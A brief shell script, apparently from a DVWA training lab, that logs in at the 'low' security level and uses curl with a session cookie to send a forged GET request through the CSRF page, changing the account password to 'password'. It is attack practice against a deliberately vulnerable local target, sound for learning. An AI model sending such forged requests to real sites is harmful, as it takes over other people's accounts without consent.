#Login with the found login
source ../levelled_login.sh low
#Check out the "CSRF" page
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" 192.168.178.98/dvwa/vulnerabilities/csrf/ > /dev/null
curl -s -L --cookie "security=${SECURITY}; PHPSESSID=${SESSIONID}" "192.168.178.98/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" > result
unset LEVEL
unset SESSIONID
